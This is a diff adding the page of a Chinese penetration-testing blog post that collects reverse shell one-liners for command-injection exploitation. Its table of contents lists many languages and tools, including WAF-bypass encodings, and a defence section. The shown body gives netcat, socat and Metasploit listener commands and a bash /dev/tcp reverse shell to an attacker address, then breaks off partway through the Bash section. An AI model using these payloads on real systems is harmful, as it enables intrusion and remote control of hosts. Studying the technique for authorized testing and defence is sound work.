@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言在渗透测试中，命令注入（Command Injection）是最常见的高危漏洞之一。成功利用命令注入后，攻击者通常需要一个交互式的 Shell 来控制目标主机。然而，目标环境往往受限于防火墙、NAT 或受限的出站规则，此时”反弹 Shell”（Reverse Shell）便成为首选方案。 反弹 Shell 的核心思路是：让目标主机主动连接攻击者的监听端口，并将 Shell 的输入输出重定向到该">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令注入：反弹Shell方式汇总">
+<meta property="og:url" content="https://congliang.github.io/Command-injection-reverse-shell/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言在渗透测试中，命令注入（Command Injection）是最常见的高危漏洞之一。成功利用命令注入后，攻击者通常需要一个交互式的 Shell 来控制目标主机。然而，目标环境往往受限于防火墙、NAT 或受限的出站规则，此时”反弹 Shell”（Reverse Shell）便成为首选方案。 反弹 Shell 的核心思路是：让目标主机主动连接攻击者的监听端口，并将 Shell 的输入输出重定向到该">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-02-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.846Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Command-injection-reverse-shell/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Command-injection-reverse-shell/","path":"Command-injection-reverse-shell/","title":"命令注入：反弹Shell方式汇总"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>命令注入：反弹Shell方式汇总 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%87%86%E5%A4%87%EF%BC%9A%E6%94%BB%E5%87%BB%E7%AB%AF%E7%9B%91%E5%90%AC"><span class="nav-number">2.</span> <span class="nav-text">通用准备：攻击端监听</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Bash-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">3.</span> <span class="nav-text">一、Bash 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%9F%BA%E7%A1%80%E7%89%88%EF%BC%88-dev-tcp-%E4%BC%AA%E8%AE%BE%E5%A4%87%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">1.1 基础版（&#x2F;dev&#x2F;tcp 伪设备）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E4%BD%BF%E7%94%A8-exec-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">3.2.</span> <span class="nav-text">1.2 使用 exec 重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E7%89%88%EF%BC%88%E6%97%A0-dev-tcp-%E6%97%B6%EF%BC%89"><span class="nav-number">3.3.</span> <span class="nav-text">1.3 命名管道版（无 &#x2F;dev&#x2F;tcp 时）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-URL-%E7%BC%96%E7%A0%81%E7%89%88%EF%BC%88%E7%BB%95%E8%BF%87-WAF%EF%BC%89"><span class="nav-number">3.4.</span> <span class="nav-text">1.4 URL 编码版（绕过 WAF）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Python-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">4.</span> <span class="nav-text">二、Python 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Python-2"><span class="nav-number">4.1.</span> <span class="nav-text">2.1 Python 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Python-2%EF%BC%88%E7%B2%BE%E7%AE%80%E7%89%88%EF%BC%8C%E5%88%A9%E7%94%A8-pty-spawn%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">2.2 Python 2（精简版，利用 pty.spawn）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Python-3"><span class="nav-number">4.3.</span> <span class="nav-text">2.3 Python 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Python-3%EF%BC%88%E4%BD%BF%E7%94%A8-pty-%E8%8E%B7%E5%BE%97%E4%BC%AA%E7%BB%88%E7%AB%AF%EF%BC%89"><span class="nav-number">4.4.</span> <span class="nav-text">2.4 Python 3（使用 pty 获得伪终端）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-%E4%B8%80%E8%A1%8C%E7%89%88%EF%BC%88%E9%80%82%E5%90%88%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%97%A0%E7%A9%BA%E6%A0%BC%E7%94%A8-Tab-%E6%88%96-IFS-%E6%9B%BF%E4%BB%A3%EF%BC%89"><span class="nav-number">4.5.</span> <span class="nav-text">2.5 一行版（适合命令注入，无空格用 Tab 或 ${IFS} 替代）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81PHP-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">5.</span> <span class="nav-text">三、PHP 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-PHP-exec-%E7%89%88%EF%BC%88%E6%9C%80%E7%AE%80%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">3.1 PHP exec 版（最简）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-PHP-proc-open-%E7%89%88%EF%BC%88%E6%9B%B4%E7%A8%B3%E5%AE%9A%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">3.2 PHP proc_open 版（更稳定）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-PHP-shell-exec-%E7%89%88%EF%BC%88%E9%80%82%E5%90%88%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%EF%BC%89"><span class="nav-number">5.3.</span> <span class="nav-text">3.3 PHP shell_exec 版（适合注入利用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-PHP-%E4%B8%80%E8%A1%8C%E9%80%9A%E8%BF%87-system-%E6%B3%A8%E5%85%A5"><span class="nav-number">5.4.</span> <span class="nav-text">3.4 PHP 一行通过 system() 注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Perl-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">6.</span> <span class="nav-text">四、Perl 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%9F%BA%E7%A1%80%E7%89%88"><span class="nav-number">6.1.</span> <span class="nav-text">4.1 基础版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E7%B2%BE%E7%AE%80%E7%89%88%EF%BC%88%E6%97%A0%E9%9C%80-Socket-%E6%A8%A1%E5%9D%97%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">4.2 精简版（无需 Socket 模块）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-Windows-%E7%9B%AE%E6%A0%87%E7%89%88"><span class="nav-number">6.3.</span> <span class="nav-text">4.3 Windows 目标版</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Ruby-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">7.</span> <span class="nav-text">五、Ruby 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E5%9F%BA%E7%A1%80%E7%89%88"><span class="nav-number">7.1.</span> <span class="nav-text">5.1 基础版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E4%BD%BF%E7%94%A8-spawn"><span class="nav-number">7.2.</span> <span class="nav-text">5.2 使用 spawn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-Windows-%E7%89%88%EF%BC%88%E8%B0%83%E7%94%A8-cmd-exe%EF%BC%89"><span class="nav-number">7.3.</span> <span class="nav-text">5.3 Windows 版（调用 cmd.exe）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81Netcat%EF%BC%88nc%EF%BC%89%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">8.</span> <span class="nav-text">六、Netcat（nc）反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E4%BC%A0%E7%BB%9F-Netcat%EF%BC%88GNU-Hobbit-%E7%89%88%EF%BC%8C%E6%94%AF%E6%8C%81-e%EF%BC%89"><span class="nav-number">8.1.</span> <span class="nav-text">6.1 传统 Netcat（GNU&#x2F;Hobbit 版，支持 -e）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E4%BC%A0%E7%BB%9F-Netcat-%E7%AE%A1%E9%81%93%E7%89%88%EF%BC%88%E6%97%A0-e-%E4%B9%9F%E5%8F%AF%E7%94%A8%EF%BC%89"><span class="nav-number">8.2.</span> <span class="nav-text">6.2 传统 Netcat 管道版（无 -e 也可用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-OpenBSD-Netcat%EF%BC%88%E4%B8%8D%E6%94%AF%E6%8C%81-e%EF%BC%89"><span class="nav-number">8.3.</span> <span class="nav-text">6.3 OpenBSD Netcat（不支持 -e）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-BusyBox-nc"><span class="nav-number">8.4.</span> <span class="nav-text">6.4 BusyBox nc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81Socat-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">9.</span> <span class="nav-text">七、Socat 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E5%9F%BA%E7%A1%80%E7%89%88%EF%BC%88%E6%98%8E%E6%96%87-TCP%EF%BC%89"><span class="nav-number">9.1.</span> <span class="nav-text">7.1 基础版（明文 TCP）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E5%88%86%E7%A6%BB-exec-%E5%8F%82%E6%95%B0%E7%9A%84%E5%86%99%E6%B3%95"><span class="nav-number">9.2.</span> <span class="nav-text">7.2 分离 exec: 参数的写法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-SSL-%E5%8A%A0%E5%AF%86%E7%89%88"><span class="nav-number">9.3.</span> <span class="nav-text">7.3 SSL 加密版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-%E5%AE%8C%E6%95%B4-PTY-%E5%88%86%E9%85%8D%E7%89%88"><span class="nav-number">9.4.</span> <span class="nav-text">7.4 完整 PTY 分配版</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81PowerShell-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">10.</span> <span class="nav-text">八、PowerShell 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E5%9F%BA%E7%A1%80-TCP-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">10.1.</span> <span class="nav-text">8.1 基础 TCP 反弹 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-Nishang-%E9%A3%8E%E6%A0%BC%EF%BC%88%E4%BD%BF%E7%94%A8-Invoke-PowerShellTcp%EF%BC%89"><span class="nav-number">10.2.</span> <span class="nav-text">8.2 Nishang 风格（使用 Invoke-PowerShellTcp）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-Base64-%E7%BC%96%E7%A0%81%E7%89%88%EF%BC%88%E7%BB%95%E8%BF%87-WAF-%E4%B8%8E%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="nav-number">10.3.</span> <span class="nav-text">8.3 Base64 编码版（绕过 WAF 与特殊字符过滤）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-%E7%B2%BE%E7%AE%80%E7%89%88%EF%BC%88%E5%BF%AB%E9%80%9F%E5%88%A9%E7%94%A8%EF%BC%89"><span class="nav-number">10.4.</span> <span class="nav-text">8.4 精简版（快速利用）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81Awk-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">11.</span> <span class="nav-text">九、Awk 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-Gawk-%E7%89%88%E6%9C%AC"><span class="nav-number">11.1.</span> <span class="nav-text">9.1 Gawk 版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F-Shell-%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-number">11.2.</span> <span class="nav-text">9.2 调用系统 Shell 的版本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81Telnet-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">12.</span> <span class="nav-text">十、Telnet 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#10-1-%E5%8F%8C%E7%AE%A1%E9%81%93%E6%B3%95"><span class="nav-number">12.1.</span> <span class="nav-text">10.1 双管道法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-2-%E5%8F%8C%E5%90%91%E7%AE%A1%E9%81%93%E6%B3%95"><span class="nav-number">12.2.</span> <span class="nav-text">10.2 双向管道法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81Java-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">13.</span> <span class="nav-text">十一、Java 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-1-%E5%8D%95%E8%A1%8C%E7%89%88%EF%BC%88%E9%80%9A%E8%BF%87-jrunscript-jshell%EF%BC%89"><span class="nav-number">13.1.</span> <span class="nav-text">11.1 单行版（通过 jrunscript &#x2F; jshell）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-2-%E7%BC%96%E8%AF%91%E4%B8%BA-class-%E5%90%8E%E6%89%A7%E8%A1%8C"><span class="nav-number">13.2.</span> <span class="nav-text">11.2 编译为 .class 后执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81Lua-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">14.</span> <span class="nav-text">十二、Lua 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-1-%E4%BD%BF%E7%94%A8-LuaSocket-%E5%BA%93"><span class="nav-number">14.1.</span> <span class="nav-text">12.1 使用 LuaSocket 库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-2-%E6%97%A0%E9%9C%80-LuaSocket%EF%BC%88%E9%80%9A%E8%BF%87-os-execute-%E9%80%90%E6%9D%A1%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="nav-number">14.2.</span> <span class="nav-text">12.2 无需 LuaSocket（通过 os.execute 逐条执行）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81Golang-%E5%8F%8D%E5%BC%B9-Shell"><span class="nav-number">15.</span> <span class="nav-text">十三、Golang 反弹 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#13-1-%E6%BA%90%E7%A0%81%E4%B8%80%E8%A1%8C%E5%BC%8F%EF%BC%88%E9%80%9A%E8%BF%87-go-run%EF%BC%89"><span class="nav-number">15.1.</span> <span class="nav-text">13.1 源码一行式（通过 go run）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-2-%E9%A2%84%E7%BC%96%E8%AF%91%E5%90%8E%E4%B8%8A%E4%BC%A0"><span class="nav-number">15.2.</span> <span class="nav-text">13.2 预编译后上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81%E5%BF%AB%E9%80%9F%E5%86%B3%E7%AD%96%EF%BC%9A%E9%80%89%E6%8B%A9%E5%93%AA%E4%B8%AA%EF%BC%9F"><span class="nav-number">16.</span> <span class="nav-text">十四、快速决策：选择哪个？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%94%E3%80%81%E5%8D%87%E7%BA%A7%E5%88%B0%E5%AE%8C%E6%95%B4-PTY%EF%BC%88%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%BB%88%E7%AB%AF%EF%BC%89"><span class="nav-number">17.</span> <span class="nav-text">十五、升级到完整 PTY（交互式终端）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Socat-%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%BE%97-PTY"><span class="nav-number">17.1.</span> <span class="nav-text">使用 Socat 直接获得 PTY</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E5%85%AD%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE%EF%BC%88%E8%93%9D%E9%98%9F%E8%A7%86%E8%A7%92%EF%BC%89"><span class="nav-number">18.</span> <span class="nav-text">十六、防御建议（蓝队视角）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">19.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Command-injection-reverse-shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="命令注入：反弹Shell方式汇总 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令注入：反弹Shell方式汇总
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-02-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-02-15T08:00:00+08:00">2026-02-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，命令注入（Command Injection）是最常见的高危漏洞之一。成功利用命令注入后，攻击者通常需要一个交互式的 Shell 来控制目标主机。然而，目标环境往往受限于防火墙、NAT 或受限的出站规则，此时”反弹 Shell”（Reverse Shell）便成为首选方案。</p>
+<p>反弹 Shell 的核心思路是：让目标主机主动连接攻击者的监听端口，并将 Shell 的输入输出重定向到该连接上。本文按技术栈系统梳理各类反弹 Shell 一行命令，涵盖 Bash、Python、PHP、Perl、Ruby、Netcat、Socat、PowerShell、Awk、Telnet、Java、Lua、Golang 等主流方案，并总结各自适用场景。</p>
+<blockquote>
+<p><strong>免责声明</strong>：本文所有内容仅供安全研究与授权测试学习使用，禁止用于任何非法入侵行为。使用者需自行承担法律责任。</p>
+</blockquote>
+<hr>
+<h2 id="通用准备：攻击端监听"><a href="#通用准备：攻击端监听" class="headerlink" title="通用准备：攻击端监听"></a>通用准备：攻击端监听</h2><p>无论使用何种反弹 Shell，攻击端都需要先开启一个监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最常用：netcat 监听</span></span><br><span class="line">nc -lvnp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用 socat</span></span><br><span class="line">socat - TCP-LISTEN:4444,reuseaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metasploit handler（适用于 meterpreter）</span></span><br><span class="line">msfconsole -q -x <span class="string">&quot;use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-l</code> 监听模式，<code>-v</code> 详细输出，<code>-n</code> 禁止 DNS 解析（避免延迟），<code>-p</code> 指定端口。</li>
+</ul>
+<hr>
+<h2 id="一、Bash-反弹-Shell"><a href="#一、Bash-反弹-Shell" class="headerlink" title="一、Bash 反弹 Shell"></a>一、Bash 反弹 Shell</h2><p>Bash 是 Linux 上最通用的 Shell，几乎存在于所有发行版中，是反弹 Shell 的首选方案。</p>
+<h3 id="1-1-基础版（-dev-tcp-伪设备）"><a href="#1-1-基础版（-dev-tcp-伪设备）" class="headerlink" title="1.1 基础版（&#x2F;dev&#x2F;tcp 伪设备）"></a>1.1 基础版（&#x2F;dev&#x2F;tcp 伪设备）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>bash -i</code>：启动交互式 Bash。</li>
+<li><code>&gt;&amp; /dev/tcp/10.0.0.1/4444</code>：将标准输出和标准错误重定向到 TCP 套接字。</li>
